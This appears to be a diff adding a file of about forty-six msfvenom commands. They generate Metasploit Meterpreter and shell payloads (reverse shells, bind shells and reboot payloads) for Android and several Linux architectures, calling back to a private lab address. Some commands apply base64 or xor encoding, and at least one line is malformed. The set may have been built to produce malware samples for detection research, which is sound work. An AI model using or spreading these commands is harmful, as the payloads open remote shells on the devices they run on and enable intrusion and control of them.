@@ -1,0 +1,53 @@
+msfvenom -p android/meterpreter/reverse_https LHOST=10.0.2.15 LPORT=9999 R > Sample41.apk -e ruby/base64
+msfvenom --encrypt base64 -p android/meterpreter/reverse_https LHOST=10.0.2.15 LPORT=9999 R > Sample411.apk
+msfvenom -p linux/x86/meterpreter/bind_ipv6_tcp_uuid LHOST=10.0.2.15 LPORT=9991 -f elf > Sample5.elf
+msfvenom -p linux/x86/meterpreter/bind_ipv6_tcp_uuid LHOST=10.0.2.15 LPORT=9991 -f elf > Sample51.elf -e x64/xor
+msfvenom --encrypt base64 -p linux/x86/meterpreter/bind_ipv6_tcp_uuid LHOST=10.0.2.15 LPORT=9991 -f elf > Sample511.elf 
+msfvenom -p linux/mipsbe/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=9991 -f elf > Sample6.elf 
+msfvenom -p linux/aarch64/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=9991 -f elf > Sample7.elf
+msfvenom -p linux/aarch64/meterpreter_reverse_http LHOST=10.0.2.15 LPORT=9991 -f elf > Sample8.elf
+msfvenom -p linux/aarch64/meterpreter_reverse_https LHOST=10.0.2.15 LPORT=9991 -f elf > Sample9.elf
+msfvenom -p linux/aarch64/meterpreter_reverse_https LHOST=10.0.2.15 LPORT=9991 -f elf > Sample9_1.elf x64/xor
+msfvenom -p linux/aarch64/meterpreter_reverse_tcp LHOST=10.0.2.15 LPORT=9991 -f elf > Sample10.elf 
+msfvenom -p linux/aarch64/meterpreter_reverse_tcp LHOST=10.0.2.15 LPORT=9991 -f elf > Sample10_1.elf -e x64/xor
+msfvenom -p linux/aarch64/shell/reverse_tcp LHOST=10.0.2.15 LPORT=9999 -f elf > Sample11_1.elf
+msfvenom -p linux/aarch64/shell_reverse_tcp LHOST=10.0.2.15 LPORT=9991 -f elf > Sample12_1.elf
+msfvenom -p linux/armle/meterpreter/bind_tcp LHOST=10.0.2.15 LPORT=9991 -f elf > Sample15_1.elf 
+msfvenom -p linux/armle/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=9991 -f elf > Sample16_1.elf
+msfvenom -p linux/armle/shell_bind_tcp LHOST=10.0.2.15 LPORT=9991 -f elf > Sample21_1.elf
+msfvenom -p linux/armle/shell_reverse_tcp LHOST=10.0.2.15 LPORT=9999 -f elf > Sample22_1.elf
+msfvenom -p linux/mipsbe/reboot LHOST=10.0.2.15 LPORT=9991 -f elf > Sample31_1.elf
+msfvenom -p linux/mipsbe/shell/reverse_tcp LHOST=10.0.2.15 LPORT=9999 -f elf > Sample32_1.elf
+msfvenom -p linux/mipsbe/shell_bind_tcp LHOST=10.0.2.15 LPORT=9999 -f elf > Sample33_1.elf
+msfvenom -p linux/mipsbe/shell_reverse_tcp LHOST=10.0.2.15 LPORT=9991 -f elf > Sample34_1.elf
+msfvenom -p linux/mipsle/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=9999 -f elf > Sample36_1.elf
+msfvenom -p linux/mipsle/reboot LHOST=10.0.2.15 LPORT=9991 -f elf > Sample39_1.elf
+msfvenom -p linux/mipsle/shell/reverse_tcp LHOST=10.0.2.15 LPORT=9991 -f elf > Sample40_1.elf
+msfvenom -p linux/mipsle/shell_bind_tcp LHOST=10.0.2.15 LPORT=9999 -f elf > Sample41_1.elf 
+msfvenom -p linux/mipsle/shell_reverse_tcp LHOST=10.0.2.15 LPORT=9991 -f elf > Sample42_1.elf
+msfvenom -p linux/ppce500v2/meterpreter_reverse_https LHOST=10.0.2.15 LPORT=9999 -f elf > Sample50_1.elf
+msfvenom -p linux/ppc64le/meterpreter_reverse_https LHOST=10.0.2.15 LPORT=9999 -f elf > Sample46_1.elf
+msfvenom -p linux/ppc/meterpreter_reverse_tcp LHOST=10.0.2.15 LPORT=9999 -f elf > Sample45_1.elf
+msfvenom -p linux/ppc/meterpreter_reverse_https LHOST=10.0.2.15 LPORT=9991 -f elf > Sample44_1.elf
+msfvenom -p linux/ppc64le/meterpreter_reverse_tcp LHOST=10.0.2.15 LPORT=9991 -f elf > Sample47_1.elf
+msfvenom -p linux/ppce500v2/meterpreter_reverse_tcp LHOST=10.0.2.15 LPORT=9991 -f elf > Sample51_1.elf
+msfvenom -p linux/ppce500v2/meterpreter_reverse_http LHOST=10.0.2.15 LPORT=9991 -f elf > Sample49_1.elf
+msfvenom -p linux/ppc64le/meterpreter_reverse_http LHOST=10.0.2.15 LPORT=9991 -f elf > Sample48_1.elf
+msfvenom -p linux/ppc/meterpreter_reverse_http LHOST=10.0.2.15 LPORT=9991 -f elf > Sample43_1.elf
+msfvenom -p linux/mipsle/meterpreter_reverse_http LHOST=10.0.2.15 LPORT=9991 -f elf > Sample35_1.elf
+msfvenom -p linux/mipsbe/meterpreter_reverse_tcp LHOST=10.0.2.15 LPORT=9991 -f elf > Sample30_1.elf
+msfvenom -p linux/mipsle/meterpreter_reverse_tcp LHOST=10.0.2.15 LPORT=9999 -f elf > Sample38_1.elf
+msfvenom -p linux/mipsle/meterpreter_reverse_https LHOST=10.0.2.15 LPORT=9991 -f elf > Sample37_1.elf
+msfvenom -p linux/mips64/meterpreter_reverse_https LHOST=10.0.2.15 LPORT=9999 -f elf > Sample24_1.elf
+msfvenom -p linux/mipsbe/meterpreter_reverse_https LHOST=10.0.2.15 LPORT=9999 -f elf > Sample29_1.elf
+msfvenom -p linux/mipsbe/meterpreter_reverse_http LHOST=10.0.2.15 LPORT=9991 -f elf > Sample28_1.elf
+msfvenom -p linux/mipsbe/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=9991 -f elf > Sample27_1.elf
+msfvenom -p linux/mips64/meterpreter_reverse_tcp LHOST=10.0.2.15 LPORT=9991 -f elf > Sample25_1.elf
+msfvenom -p linux/mips64/meterpreter_reverse_http LHOST=10.0.2.15 LPORT=9991 -f elf > Sample23_1.elf
+
+
+
+
+
+
+
